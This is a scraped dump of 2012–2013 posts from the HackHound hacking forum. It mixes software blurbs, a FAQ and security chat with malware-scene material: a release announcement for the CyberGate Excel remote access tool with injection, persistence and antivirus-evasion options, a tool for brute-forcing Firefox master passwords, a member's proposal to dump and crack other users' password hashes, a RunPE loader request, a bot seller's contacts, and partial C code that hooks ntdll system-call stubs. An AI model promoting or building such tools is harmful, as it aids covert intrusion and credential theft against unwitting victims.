R.A.I.D. Beta - Malware Samples - HackHound,raid-beta,Dante,10/20/2012 0:00,"Official stands for organized by owners, accepted by owners. The owners/staff of OpenSC had no clue that binaryhero was a scammer, they only found out after it was done thus not being official. Oh really. How exactly you know all that? I assume those are the owners words right? Good for you if you believe in all that. As far as I am concerned he lied so many times in the past that I would not trust a single pencil to him. For me official is something really simple: - supported and encouraged by owners and staff with its own section at opensc; That's more then official to me. Ultimately administrator is always responsible for all the decisions he makes. If he is not responsible for his decisions and decisions that affect members in general then he is not an administrator. Of course he cannot monitor the people that works with him 24/7 but he is the ultimate responsible for what happens on that board and they (owner and staff) decided to have this as an Official tool there. The same way i consider HH administrators responsible when they set Spy-Net as an official application that ended up to be a backdoored tool. For me there's no room or excuses for mistakes like this.",IntermediateMember

EurecaLog - Development Software - HackHound,eurecalog,julio,2/1/2013 0:00,"EurekaLog 6.0.25 Entreprise EurekaLog is the new Delphi and C++Builder exeption tracer tool that gives your application (GUI, Console, Web, etc.) the power to catch all exceptions, memory leaks and detect infinite-loops and deadlocks. It generates a detailed log with the call stack at the point that raised the exception, showing unit, class, method and line number and displays it on screen and optionally sends it back to you via email or to a Web Server (using the HTTP-S/FTP protocols or sending directly to your preferred ""Web Bug Tracker"" software), thus helping speed up the process of bug-location and resolution by a factor of 10! EurekaLog is easy to use because it's fully integrated into the IDE - just enable EurekaLog for your application and rebuild your application to add EurekaLog's features. EurekaLog does not affect application performance (it runs only when an exception occurs) and increases compiled file size by just 0.5% - 4% (it uses this space to store some additional, compressed and encrypted debugging information). You do not need to distribute any additional files with your EurekaLog-enabled application. EurekaLog is compatible with Delphi 3, 4, 5, 6, 7, 2005, 2006, 2007, 2009, 2010, XE, XE2, XE3 and with C++Builder 5, 6, 2006, 2007, 2009, 2010, XE, XE2, XE3 (including Personal, Turbo and Starter editions). It works on Windows 95, Windows 98, Windows ME, Windows NT, 2000, Windows XP (x32 and x64), Windows Vista (x32 and x64), Windows 7 (x32 and x64), Windows 8 (x32 and x64), Windows Server 2003, Windows Server 2008 (x32 and x64), Windows Server 2008 R2 (x32 and x64), Windows Server 2012 (x32 and x64). It supports both Win32 and Win64 platforms. It supports VCL, CLX and FMX (FireMonkey) frameworks. Note: Delphi 3 and Windows 95-NT are supported only by EurekaLog 4-6.

D7 is one of the most successful IDEs created due to its stability, speed and low hardware requirements,and also added support for Windows XP Themes, and added more support for building Web applications. It was the last version of Delphi which could be used without mandatory. Delphi XE2 supports 64-bit Windows, in addition to the long-supported 32-bit versions, with some backwards compatibility. Applications for 64-bit platforms can be compiled, but not tested or run, on the 32-bit platform.[3] The XE2 IDE cannot debug 64-bit programs on version of Windows prior to Windows 8. Delphi XE3 natively supports both 32-bit and 64-bit editions of Windows (including Windows 8), and provides support for Apple Mac OS X with the Firemonkey 2/FM² framework. iOS support was dropped with XE3 release initially, but applications can continue to be targeted to that platform by developing with Delphi XE2. It depend from users , projects , and their needs from delphi. I agree with you Ravage XE2 and XE3 are the best IDE now with their a native multi-platform deployment, and component-based visual development, and heterogeneous database and cloud connectivity.",IntermediateMember

We have decided not to take it to a beta stage and give this opportunity to customers instead. Reason for this is really simple. Nothing better than our customers that will use this new application on real time situations to give us the feedback we need to make Excel a better Remote Administration Tool. A testing environment would never give us this. In the next few weeks we will producing videos, papers and tutorials about it and also a public version. This is the first version ever being distributed outside our development environments so please use Excel with precaution. There might be problems and bugs not reported yet. Beware of that. This is suppose to be the bare bone version of Excel. The basis of what we will build. There are a few features that haven't been added to this version for the simple reason we want the basis of Excel to be as stable and reliable as possible. Soon Excel is a reliable solution all extra features (Reverse Proxy, Tasks, Console Server, password recovery improvement and few other surprises) will be added to it. We would like to request if you have any bug to report please do it on Cyber-Software forum - (http://www.cyber-software.org/forum). We will not reply to bugs reported on members support area, since it would cause the chaos. We would like also to request to be patient this next few days when requesting the license, since we will be generating thousands of new licenses and it may take a while to reply back and send you the license you need. Just be patient. Everybody will get their licenses on a reasonable period of time. With Excel being released is the end of the line for CyberGate Personal Edition and Solitude. All existing customers can keep using them and request licenses and license changes but they will simply not be updated anymore. They will be removed from sales soon as well. All existing customers will get, obviously CyberGate Excel free of charge, for the period of time that was set when purchasing the original product. This beings said let me introduce to you the whole new CyberGate Excel: Client: - Client programmed and compiled with Delphi2010; - We have used the same intuitive and simple concept of CyberGate for Excel. It is easy to use, attractive and functional; - One major concern was to make it also more professional due to the high demand of our applications and also the needs of our customers; - Most commands, features, buttons and fields have tool tips. Meaning all you have to do is pause your mouse over it to see a brief description of what it does or what the options are; - Server can be created on 3 different ways in order to reduce server size or avoid network stress issues (server plugin from resources, upload from client or from URL); - Server installation has a load full of options, from injection to startup options, binder etc; - Also new on server is the ability to add server to IRC bot, email notification or tagging server when it gets online, uploading files to a web host that can be dropped from create server window; - Unicode support; - integrated connection menu on each feature. Meaning you don't need to go to client anymore to use a different feature on that connection. Just open menu straight from that feature and start the new feature you want; - integrated group support on connections list that is set on create server window; - intuitive menus for connection features or group features; Server: - Server programmed and compiled with d7; - Server size will depend on option used but range can be either 47 or 408 kb's. Security: - Security was a major concern and we've decided to implement AES encryption with a 256 bits key traffic encryption; - Server resources encryption with modified RC4 (this might be changed to AES as well on future versions); Notes (important): - CyberShield users - do not check persistence when crypting Excel servers with it; - Check ""hide"" to assure better protection and to make sure your server won't get killed",Beginner

VBConversions' VB.Net to C# Converter is a state of the art conversion program which rewrites your VB.Net project in C#. Unlike other conversion programs, variable names, comments, and inline comments are preserved, and code conversion accuracy is over 99%. The VB.Net to C# Converter even converts some of the most difficult features other programs don't even attempt, such as ReDim statements, parameterized properties, local shared variables, On Error Goto's, event handling, complex Case statements, API calls, and more Other conversion programs either reverse engineer assemblies, producing unreadable assembly like code in C#, or else attempt a source code to source code conversion which isn't very accurate. VBConversions' VB.Net to C# Converter is a source code to source code converter. Your code maintains its original readability and flavor (including line and inline comments), Reliability is very good, over 99% accuracy in most tests. Here are some key features of ""VB.Net to C# Converter"": · You are in complete control of the conversion process. There are literally dozens of conversion options you control, from how ref arguments and with statements are handled, to how much you want to eliminate dependencies on the Microsoft.VisualBasic namespace. · Each release is rigorously tested on hundreds of thousands of lines of VB.Net code. Virtually every line of sample code Microsoft releases is tested, along with many real world projects and sample code from third party vendors. · Comprehensive reporting is available every step of the conversion process. Before conversion, your code is scanned and you are warned about anything in your code which could be a problem. During conversion, you are not left to guess what we did to your code. Anything of interest done during the conversion is reported. After conversion, any C# compiler errors is also reported. Flexible and comprehensive reporting is very valuable when converting large projects. Many customers have said this is one of our best features. · First class Visual Basic 2005 support. Other converters VB2005 support is spotty and error prone. Generics, Operator Overloading, and the My namespace are completely supported.",Member

iSnippet - Development Software - HackHound,isnippet,Protocol,7/12/2013 0:00,"Version 0.3b WARNING You can not use other database versions from previous isnippet versions without changes to your database. This is due to changes in the language selection procedure. This has been done to work better with future versions of scintilla dynamic linked libraries. In order for you to use an old database you open up your old database with an sqlite browser and set all your snippet languages to 'null' (no quotes). This will allow you to load your database and reset your syntax for each snippet. A quicker way would be to download sqlite here or http://www.sqlite.org/download.html and selecting the windows version. Open up a command prompt in the same location as the sqlite3.exe and type sqlite3 snippets.db This should open up your snippet database (obviously replace snippet.db with your database filename) then type the following command as it appears below including ' and ; characters UPDATE TBL_SNIPPETS SET LANGUAGESYNTAX = 'null'; now your old database should work correctly with the current version of iSnippet. General You can now load databases on the fly, providing you load a valid snippet database the main interface will be populated with the current loaded database. Also you can now set a default syntax this will help if your adding lots of snippets with the same syntax. Format Styles format styles to suite your needs share your config.cfg with friends allowing them to use your styles aswell. List of included snippets hopefully we can make this a nice default database collecting snippets from all of the forums around the scene. Change Log ------------------------------------------------------------------------------------------------------------------------------------ Add Remove Modified ------------------------------------------------------------------------------------------------------------------------------------ ------------------------------------------------------------------------------------------------------------------------------------ Version 0.3b ------------------------------------------------------------------------------------------------------------------------------------ [08/JUL/2013] Fixed issue with default font not saving to file due to programmer error commenting out code when debugging but forgetting to uncomment it. [08/JUL/2013] Fixed issue with default syntax not having a default value when no config will is found resulting in werid access violation errors or crashes when trying to edit or select snippets. [08/JUL/2013] Fixed minor preformance bugs making iSnippet run smoother. [03/JUL/2013] Fixed issue with saving settings to config database, settings were not being saved correctly, which cause issues when loading them back resulting in conflicts between default settings and saved settings. [23/JUN/2013] Fixed bug with color selector [12/APR/2013] by defining specific values for colors making them different. Light Gray = $d3d3d3, Dark Gray = $696969. Colors should be selected correctly now unless a custom color is the same value as an existing color. [12/APR/2013] Moved gutter line number width update to OnUIUpdate rather then OnPaint as it will be trigged only when needed and not every paint. [12/APR/2013] Bug with color selector / Delphi colours silver / light gray have same hex code $c0c0c0 therefore color selector will select first colour by alphabetical order. Light gray being first. [14/FEB/2013] Changed the way in which syntax is stored in the database in order to be future proof. syntax is now stored as a string rather then an integer. This makes look up of a syntax slightly slower but will not cause errors if more languages are added / removed to Scintilla dll over time as Scintilla stores syntax's by name. [10/JAN/2013] Minor bugs fixed relating to updating the current display snippet language. [18/DEC/2012] Fixed dialogs to center on main form. [18/DEC/2012] Added setting dialog for configuration to application Original Thread //http://www.ic0de.org...-isnippet/page8 You guys don't have a general programming forum so I thought tools was the right section please feel free to move it.

That's basically what it's for (or more specifically that's what it can be used for). just flame or fun That's where it gets complicated. Flame someone? That person might then feel provoked and 'counterattacks'. In the end there are pages full of flamewars where both parties feel insulted/mad/angry in the end. The problem is that people often interpret fun differently. Some are easily insulted, others stand above pretty much everything. And that last part is what I think HackHound should do here.

Why use sendto integration? Because im lazy as hell and figure some of you guys are too. Not much other reason for using it really. How does sendto integration work? This application will make a shortcut to itself in your sendto folder (typically located in %APPDATA%Roaming\Microsoft\Windows\SendTo). If there is already a shortcut there for another copy of the app, it will give you the option to update the shortcut path to the path of the currently running executable (in case you wish to use a copy from c:\program files and some other folder as well) If the shortcut already exists and it points to the current copy of the app, it will give you the chance to remove it if desired. How is sendto integration used? Just as if you right click using your mouse on some shortcut under your start menu, there is a popup menu for ""Send To"" containing various options and/or files which could be used with the specific file. If you right click on a file (.exe's only, others will result in a message and the app closing) and select Send To PE TOOL then windows will use the cmd line to send this files path to the PE Tool and the gui will come up with your selected file pre entered and you can fill in the remaining options.

These approaches are used by the TIER project.[7] In addition to power levels it is also important to know how the 802.11 protocol acknowledge each received frame. If the acknowledgement is not received, the frame is re-transmitted. By default, the maximum distance between transmitter and receiver is 1-mile (1.6 km). On longer distances the delay will force retransmissions. On standard firmware for some professional equipment such as the Cisco Aironet 1200, this parameter can be tuned for optimal throughput. OpenWrt, DD-WRT and all derivatives of it also enable such tweaking. In general, open source software is vastly superior to commercial firmware for all purposes involving protocol hacking, as the philosophy is to expose all radio chipset capabilities and let the user modify them. This strategy has been especially effective with low end routers such as the WRT54Gwhich had excellent hardware features the commercial firmware did not support. As of 2011, many vendors still supported only a subset of chipset features that open source firmware unlocked, and most vendors actively encourage the use of open source firmware for protocol hacking, in part to avoid the difficulty of trying to support commercial firmware users attempting this. Packet fragmentation can also be used to improve throughput in noisy/congested conditions. Although packet fragmentation is often thought of as something bad, and does indeed add a large overhead, reducing throughput, it is sometimes necessary. For example, in a congested situation, ping times of 30 byte packets can be excellent, whilst ping times of 1450 byte packets can be very poor with high packet loss. Dividing the packet in half, by setting the fragmentation threshold to 750, can vastly improve the throughput. The fragmentation threshold should be a division of theMTU, typically 1500, so should be 750, 500, 375, etc. However, excessive fragmentation can make the problem worse, since the increased overhead will increase congestion.""",Suspended

There is a complete set up on Ebay. They work but have not the performance that doesn't even come close to this one. And don't forgot to get the max out of it you need to feed it with 2 USB port for extra transmit power. I believe 1mah (2x500mah if it is USb2.0 or 1.0) if you are using it on USb 3 it will be fine on one port i think. The transmit power is not the most important thing! The antenna is, with a good one you can make of a silly 100milliwatt a long range device. Why do you think the comments say #^$@#@# IT CAN REACH 30 KM. Because the transmit power is a overkill and the antenna you get with it is alright can easily give you a range of 3KM easy. If you buy yourself a good antenna you will reach more than 30KM for sure. (http://www.ebay.com/...a-/360381722369) Let me check Wikipedia. ""500mA (0.5A); in USB 3.0, it moves up to 900mAh (0.9A). The charging downstream and dedicated charging ports provide up to 1500mA (1.5A)."" So you either need 2x USB 2.0 or 1.0 port to feed it 1A or one 3.0 port for 0.9A (good enough). For the device i advised you. Also a nice tip for long range: http://en.wikipedia....ki/Fresnel_zone And now a healthy tip: Put it on your roof, do NOT test it in a close range pointed at you! This device generates such high emf levels that it can cause cancer and other shit that you don't want Or if you want to build one yourself: Or you could try to make your own antenna from a old satellite dish.

This book teaches you how to use C++ to enhance your Visual Basic applications without rewriting them from the ground up. In this book, you will learn to write DLLs that use the performance and capabilities of C++, which provide access to APIs not easily supported by VB. Using C++ and the ATL (Active Template Library), you can even write ActiveX components that don't require a huge runtime library. Writing from the perspective of an advanced VB programmer—and using his own learning process as the framework—author Jonathan Morrison teaches you how to harness the development power of C++. Beginning with an overview of the ways in which C++ complements VB, he moves on to cover the VC++ development environment that most VB programmers will turn to first (Visual Studio), exploring a wealth of topics including the differences between VB and C++ compilers, the C preprocessor, and the process of memory management in C++. In the second half of the book, Morrison discusses the basics of the C++ language, including data and variables, operators, loops, and control statements. He then covers pointers, classes, and templates. The book also contains comprehensive coverage of VB and C++ DLLs, how to use C++ DLLs with VB programs, the ATL, and COM objects. About the Author Jonathan Morrison has written several books on C++ and Visual Basic programming, and has over seven years of experience developing applications in Visual Basic, C++,and Java. He has consulted for Racal Datacom, The Maxim Group, and Cyberguard, and has held lead development positions at AIG, Autonation USA, and Digitalbond Inc. He currently works for Microsoft's Solution Integration Engineering Team, where he helps Microsoft's enterprise customers design, develop, and debug their large-scale applications.",IntermediateMember

MozillaRecovery - retrieve master passwords of Firefox and Thunderbird - Team Projects - HackHound,mozillarecovery-retrieve-master-passwords-of-firefox-and-thunderbird,Deque,9/26/2013 0:00,"MozillaRecovery Requirements: Java 7 About the program Once you start the program, it searches automatically for default locations of your key3.db in Firefox and, if not found, in the Thunderbird application directory. I prepared and tested this for Windows 7 and Linux. If it is not working for your OS, please tell me the default location for it. I just need the information to put that in. You can change the location by hand, of course. key3.db is the file that is used to recover the master password. You can start a wordlist attack on that. The program ships with a default worldlist, but it is small (I didn't want to upload a wordlist file that adds several megabytes to the program). You can use your own list by changing the location. Alternatively you can generate the words by activating the ""generate words"" checkbox. Although I used threads, word generation is limited to a word length of five (a bruteforce attack with a wordlength of six would take several days, so I don't allow that) and the alphabet a-zA-Z by now. I got about 30000 password tests per second on my machine. Once you got the master password, it is very easy to obtain saved login information from signons.sqlite, since both, Thunderbird and Firefox, will show usernames and passwords in plain text. (google if you don't know how) Conclusion: Always set a master password if you save login information with Thunderbird or Firefox. Otherwise the login information can be obtained without any problems. About the Source The only (non-standard) library I used is apache.log4j for logging purposes. You will see a properties file and a log folder. The standard logging level is WARN. If you change this level to INFO or DEBUG, the master passwords found with the program will be saved in there, so be careful with that option. LOC: 914 The code was tested for: Firefox 9.01 Thunderbird 9.01, Windows XP, Vista, 7, Arch Linux Problems? Please make sure that you have Java 7. If there are still problems, post the logging file that is in the logs folder.

FAQ - Official - Suggestions & Support - HackHound,faq-official,x58,9/30/2013 0:00,"Q: I cannot send any private messages it says ""You do not have enough posts to send a new PM"". A: This was done to prevent bots and new people from sending spam messages. Please make a topic regarding it in Support & Feedback forums to get this solved. Q: Is it possible to change my username? A: Yes if you have below Q: How can i become a verified seller? A: Contact a administrator and show that you are the owner of the product that you are selling. And your usergroup will be changed to 'Verified seller' and you will have the ability to make topics in the Verified market. Q: People are adding me as friend all the time and it irritates me because i don't want to be their 'friends' A: Click on your name in the right top corner press on My Settings, go to General Account Settings and check 'Allow me to approve members before they're added as a friend' in the section Friends. Q: Can i advertise my website on HackHound? A: Yes and no. If you are selling a product in the Flea market or Verified market as a Verified seller or Normal member, you are allowed to include a URL to your website of the product you are selling. You are allowed to ask in the web master or in the General lobby for improvements of your website, peoples opinions about it or if you need help developing or securing your website. You are not allowed to do else but only in the described ways. Q: I want access to the HackHound scanner.. But how? A: This is only possible if you have contributed to HackHound in a good way(not just 2 tutorials for example), after that we will manually put you in another usergroup (Associate) And you will be able to request the scanner by sending one of the administrators a private message and we will create a account for you. Q: What should i do to avoid getting banned or warning level added? A: Read the rules & regulations carefully, use common sense, act like a mature person, don't write 6 character replies, don't spam, have respect for all members and staff.. And so on.. Q: Can i attach a third party copyrighted file (original/cracked) to the board? A: If the vendor or copyright holder has given you permission or their terms allow you so you will have the right to do so. If those rules tell otherwise, no don't attach it, but host it elsewhere. Q: Why do i have no access to the shoutbox, why is it invisible for me? A: Be patient, use the forums and contribute something relevant to forum discussions. Before long you'll get access to the shoutbox automatically. Q: How should I ask programming question when my shit-code is not working? A: First of all try to understand that you need to learn to walk before you are able to run, so take time to learn your programming language of choice and never copy-paste snippets that you don't understand. Try using debugger and learn to use it if you don't know how, debugger skills are very useful. Try to Google/Bing/Duckduckgo out your problem, many of the common programming problems were already solved here and on many other forums. If debugger and Google/Bing/Duckduckgo are not helping try to ask your question here, but bare in mind that we don't have telepathic powers. So provide your buggy source code in a form as full as possible, also detailed description of your problem and some debugging information may be very helpful. Q: How should I ask for topic deletion or edit or similar support? A: Use the report system or pm a Administrator or moderator. Please don't use the Shoutbox for support but the private messaging system and report system, that is in place for this purpose. More will be added meanwhile.

Because I have no experiences with VPS I have a few questions about the configurations etc. of my purchase. The first reason I want to buy the VPS is because I want to set up a small VPN for not more than 5 users, I want to host a blog / website and execute some scripts via the server. The pack I'd choose is the following Linux Virtual Private Server (VPS) - Linux VPS-Basic (Basic Pack for Private Website Hosting) 30GB Space 600 Mhz CPU 1GB RAM 1Mbps Bandwidth I can choose between CentOS 6 and Ubuntu, therefor I have some experience with Ubuntu I'd prefer Ubuntu, but I maybe CentOS 6 would be better for my issues? Do I need a Control Panel? - extra costs The price is around 20$ / month; too expensive? Is it (I know it is never really safe) to pay with my own CC? Does anyone have experiences with Shinjiru? Other recommendations for VPS? Thanks in advance!",Beginner
"First VPS Configuration - Security, Anonymity & Privacy - HackHound",first-vps-configuration,x58,10/4/2013 0:00,"Centos is fine. 1Mbps Bandwidth? Must be 1gbps or 1mb/s - 1024kb/s (8mbps) guessing? If i was you i wont pay with your CC only if you are sure they company is trusted, try to check site advisors like mywot. Openvpn is easy to setup and there is no need for you to pay for openvpn-as (lot of money for licenses) because with this Ethernet backend you will never get the max out of it. http://hackhound.org...t-linux-client/ you don't need a control panel if you feel the need of having one i would recommend you webmin. Please be warned by this one make a solid htaccess rule rewrite with apache that comes with centos because you don't want bots to knock on your backdoor or people trying to exploit it. And adding a double verification to ssh (keys & password) is also not a bad idea, besides that i would use cloudflare cdn to avoid skids getting your server ip address and if you are going to put a forum on it, make sure you disable remote avatar upload and get yourself a smtp proxy/relay to forward mta so people cannot do the forgot password, view e-mail source trick to reveal your server address.

We hope to challenge you, give you a hard time, and make you think independently during the training. We will often throw you into the deep end with short exercises and challenges. You won't be served fish, you'll be taught to catch them. My personal opinion of the IT security arena is that it should be formally separated into two distinct fields - “Defensive Security” and “Offensive Security”. This idea came to me when a good friend and Microsoft Networking mentor of mine came to visit me during a course. We started talking about the (latest at the time) ZOTOB worm (MS05-039) and I asked him if he had lately seen any instances of it. He answered that he saw an infection in one location, where is was overcome quickly. He then said: “That ZOTOB was annoying though, it kept rebooting the servers until they managed to get rid of it.” It was then that a massive beam of light shined from the heavens and struck me with full force.

[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,BullDog,11/3/2013 0:00,"Interesting idea. Let's see if I can get the ball rolling on this one. By the way, don't take my answers too seriously lol. What's your first post/topic? A topic where I introduce myself as the new admin. What would you say? Probably some long emotional post like blablabla new era!... blabla x58 and Ravage can suck it, I'm the boss now blabla... What would you change? Hmmm... off the top of my head I can only think of some minor changes right now. 1.) Update the dead link to the contact form in the navigation bar. 2.) Probably get rid of the ""Blogs"" module, because it's barely being used. 3.) Allow private messaging for everyone again. I (as a member) would rather receive a spam pm once in a while than having to request access first. 4.) Get rid of the ""Flea Market"" and only keep the ""Verified Market"". 5.) Get rid of the following subsections: - Programming iOS - (In)Security Hashes 6.) Use the ""Portal""-site more (post more articles). Probably even make a group that takes care of that. 7.) Make regular contests (e.g. a programming contest all 3 months). What skin would you choose as default? ""DarkEnergy"", because I'm used to it and I think it suits HackHound the best. Apart from that I would keep ""IP.Board mobile"" to properly support smartphones/tablets. Which member would you warn cause he's been really getting on your nerves this last couple of days? I'm not saying that in public . But generally speaking, members that behave immaturely and break the (minor) rules. Which member would you ban? Members that break the rules frequently or only come here to advertise/post spam etc (break major rules). What topic would you lock for good? - Topics that result(ed) in long/endless discussions. - Topics that don't need discussions (e.g. an announcement).",AdvancedMember
[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,fool'sfool,11/4/2013 0:00,"Interesting... at first I was at a loss, but maybe there's some fun stuff I can think of... What's your first post/topic? Hard to get fancy with this, so I dunno.... maybe just a laconic style topic/post. What would you say? "" What would you do? Honestly? At first, I'd explore around the various admin interfaces, learn what I could. Also, I'd do admin stuff, moderate, maintain, etc. If I was also administrator for the whole website & server I'd be right into that since I've not managed that before. Keeping that in mind, I would definitely not be touching anything until I was on top of how it works... if at all. Since this is 24 hrs, I'd probably say that's just a look but don't touch scenario. Then I'd make avatars slightly bigger, cause I spent ages making mine and you can't see it properly. What would you change? Hmm... I think it'd be nice to have something for the associates. As I see it that's a little thing that says ""these people are contributing members, valuable to have around."" The scanner I guess is already like this, but maybe something like a group projects idea where they can collaborate (probably hard to get going or maintain) or simply a forum they get access to where questions and requests can be made, and since they're self demonstrated to be worthwhile members, that'll get bigger explanations, more attention, links to resources and a better answer, since they're guaranteed to be that much more worth making extra time for: they're proven members I guess. What skin would you choose as default? Okay, I just explored them. I'd keep it at DarkEnergy. DarkMatter is kind of cool, but that much dark red looks wierd. Plus the angled bars all over annoy me. Which member would you warn cause he's been really getting on your nerves this last couple of days? PongLenis. Sorry bud, but I will say I already told him off and he took it like a champ and was decent thereafter. Which member would you ban? All accounts like this: http://hackhound.org.../9606-tr1n1t1x/ Okay, here's a link in with my ""stuff for associates etc"" idea: I'd also dump a bunch of data from these accounts, for fun, research and profit and turn it into a little project for us all. Number 1, I'd pull out all the login, visiting time data, all of that, build up a nice little csv file detailing their login and viewing history, enough to gauge when and how often they looked at the board and maybe what they looked at (probably too huge). I'd separate out the IP's, but keep it recoverable if needed, same with email addresses, and possibly login names (I'd use unique ID's for reference), because guess what, I'm also dumping the password hashes for all those unused idle accounts (especially the ones that visit regularly but never post, shiiit). Password hashes are a restricted project for a subset of the membership (let's all fine tune our JTR rules, fuck 'em, the accounts are gone, never used and emails/logins are separated - no used accounts are to be dumped, 1 post = not in list). The forum visitation data is for a more general project, maybe associates or even just everyone. We can all grab that csv file and analyse the shit out of it to see just what these guys are doing, how frequently, how much activity, is it regular, is it sporadic... what? Identify the clusters, different types, and then... well if it gets really interesting, we consider connecting it back to the ip's and see who's watching. Plus we'll learn some very legitimately interesting stuff about how people use forums, catagorisation of forums. Hell, I'd submit this kind of thing to a journal, who wants to be a published author on an academic paper? Resume's anyone? ""In depth analysis of the behaviour and timing of active but idle agents on a security forum."" Bam. What topic would you lock for good? http://hackhound.org...onymous-online/ You already locked my original choice, the guy asking how he can hack his schools server. I liked my advice to him though, I have my small petty fun with those guys before you condemn them to the bin. That was fun!

[Fun] Today you are HH administrator - Challenges - HackHound,fun-today-you-are-hh-administrator,Hess,11/4/2013 0:00,"Funky , but good one. 24 hours is a bit short for administration (all people who were or are admins know that) , but let's start with Q&A. Q: What's your first post/topic? A: Introduce myself as a new admin , thank existing staff members for giving me trust , etc.... And , also will say , as various people sometimes get envy and such that I was not preaching for that , and who likes it , likes , who doesn't he doesn't has to , but insults or any kind of personal attack will not be tolerated. Q: What would you say? A: I think I said it above , so , I don't know what else should or I will say , honestly. Q: What would you do? A: Take a look at existing things , and look how they can be improved or fixed. Not necessarily I'd have to to something in that short time. Q: What would you change? A: Add interesting stuff to Portal aka Front page of board. ATM , I have no really too much ideas , since , as I stated , 24 hours is too short. Q: What skin would you choose as default? A: Keep the current skin as this one looks good , and has been always on HH , since it's beginning. Q: Which member would you warn cause he's been really getting on your nerves this last couple of days? A: There are several them , so , one is not enough , because , I am getting too much requests for literary things that I have no and probably wont do for them , as they are usually leeching requests , like crack this for me , do this for me , etc.... Q: Which member would you ban? A: All members that are literary doing nothing here , just watch , request stupid things and do not log in for at least 10 days , reason for that is , because , some of them just come to grab something , and get loose and similar stuff..... Q: What topic would you lock for good? A: Any hacking request topic and any topic that gets off topic or gets too much discussed without anything that leads to solution and some other things that are not on my mind right now. Under ""etc..."" will be: A lot and nothing , as , I an ordinary member can't see what is happening there ""behind scenes"" , and that is why such contradictory answer.

[WTB] RunPE x32/64 with relocation [C/C++] - Trades & Freebies - HackHound,wtb-runpe-x3264-with-relocation-cc,0x22,11/15/2013 0:00,"Thanks for being helpful Johannes, I never used custom headers, the problem is me not grasping the concept fully or something else.. I'm not quite sure anymore... First off i want to thank you for taking your time to look at my problem. First i made this crude attempt to make it work with wow64 and 32 ofcourse. This code presents several problems. First off, it will potentially have two execution paths. One for pure 32 bit and one for wow64. In my opinion this is not the best solution ive seen but its what ive managed. I've probably read everything thats available on MSDN and other sources about the PE file format and the windows loader. I can't say i understand everything but i think i have a good grasp of the consepts. Anyways this code does not work, it definately have a problem with the IAT (import table). This is probably asking more but, obviously im not fully capable of understanding this on my own. My three points i have most trouble understanding is: 1) How to make it 32/64/wow64 compatible (never done this for anything ive ever coded before) 2) Fully understanding base relocation and IAT (I think actually base relocation works?. (see code)) 3) Understanding the different execution paths i have to take, when the file either has equal imagebase as the process or, not equal imagebase but has a .reloc table, or does not have equal imagebase as the process and do not have a .reloc table. Thanks for taking your time to read through this.

Do you need a very good detection rate scantime and runtime, or would you prefer a fast and reliable AV-solution? There is no perfect AV-Solution at all. Personally, I would recommend Qihoo 360 Internet Security, since it's very lightweight, easy to use and has one of the best scantime detection rates on the market (it uses the AV engines of Bitdefender, McAffe and it's own at the same time) WHen it comes to a so called ""Internet Security Suite"", I would have a look at Bitdefender 2013/2014 Total/Internet Security or Kaspersky Internet Security 2013/2014. These two are the leaders in the most rankings, but they may also slow down your PC, and from what I've seen, they need quite a lot time for their own startup, which makes yoru system more vulnerable for the whole ""virus.exe"" in autostart thing, since the .exe may get executed before your AV could is even awake. @X-H0rr0r-X, sorry but I can't let you go with this. Avira is by far not the best. I would even go farther and say, with MSE it's the worst, It has no real HIPS, the detection rate is quite bad, NOT because it lets 47/47 .exe's on your system, it just marks every shit down (false positive).

Also, there is no real need for an extra Firewall, since the Windows FW does it's job pretty good nowdays, and about 99% of all routers have a ""Hardware"" FW.

When you scan your system every few days with these, you PC's security is over 9000!!!!! I disagree, Comodo does not slows down your pc a lot. And those firewalls you mean aren't much if we talk about injection and the usage of port 80. And hitman pro is a second opinoin anti virus scanner for on demand scanning, what you can only use once in a while when your pc is already fucked by malware. You should take action at the cause of a infection not just say at the end ow well today is Friday on-demand time (2 hours later, 10 viruses found & removed). This is not the way you should take care of it since it may already be to late and your personal information or accounts are probably already compromised. it is kind of common trade off... generally the more SSDT hooks AV make, the more secure you are using Windows... Kaspersky is a champion in kernel mode hooking (so we can consider it to be the slowest one), however Comodo usually gets more points in different proactive defence tests (well at least for ones that I've seen)...

If you get scammed by someone, you will not get this bot for free, I hope that is understandable. Here are some facts: - This is the only way to contact me: Via PM here, icq 351734, jabber atrax@zauris.ru, old jabber account: atrax@jabber.ccc.de - I don't use tor chat or any other messenger - I don't speak russian. I speak german and english. This is why I use 1 sales person on a russian forum! But he will not scam you and he can't provide you a bin either! - I will not send you any exe file except the bot binary!

Easy code to hook any NT system service stub in less than 60 lines - Resources - HackHound,easy-code-to-hook-any-nt-system-service-stub-in-less-than-60-lines,Guest_mbeta_*,12/8/2013 0:00,"I wrote this awhile ago and posted it on **, but they have since restored to a copy of the db that doesn't have it. So I thought I'd repost it here. It's basically some code to easily hook usermode system service stubs (Or any export in ntdll that begins with Nt* or Zw*). I did it mainly to show that hooking doesn't need to be some big production, nor is it always complicated. If you know what you want to hook, you can develop easier ways for it than some universal hooking engine. Here's how it goes: 1. Reads the SSDT index from the MOV instruction that every Nt* service stub begins with. 2. Allocates memory to store this mov instruction, plus a stub for redirecting control to target_function + 0x5 bytes 3. Replaces MOV instruction with a relative JMP instruction. The MOV instruction is only 5 bytes, same as JMP, so this makes things easy. #include typedef NTSTATUS (NTAPI *vZwResumeThread)(IN HANDLE ThreadHandle, OUT PULONG SuspendCount); vZwResumeThread oldZwResumeThread; LONG NTAPI ZwResumeThreadCallback(IN HANDLE ThreadHandle, OUT PULONG SuspendCount) { MessageBoxW(0, L""Hook worked!"", L""Hook"", MB_OK); return ( oldZwResumeThread(ThreadHandle, SuspendCount) ); } int NtHookInstall(__in LPVOID m_pvTargetAddress, __in LPVOID m_pvRedirectAddress, __out LPVOID* m_pvOldStub) { // Misc checks if ( m_pvTargetAddress == NULL || m_pvRedirectAddress == NULL || m_pvOldStub == NULL ) return -1; if ( *(BYTE*)(m_pvTargetAddress) != 0xB8 /* MOV */ ) return -2; DWORD m_dwOldRights = NULL; LPVOID m_pvTempStub = VirtualAlloc(NULL, 1024, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); if ( m_pvTempStub == NULL ) return -3; // Unprotect beginning of target function if ( VirtualProtect(m_pvTargetAddress, 5, PAGE_EXECUTE_READWRITE, &m_dwOldRights) == FALSE ) { VirtualFree(m_pvTempStub, NULL, MEM_RELEASE); return -4; } // MOV EAX, *(BYTE*)(m_pvTempStub) = 0xB8; *(DWORD*)((LPBYTE)m_pvTempStub + 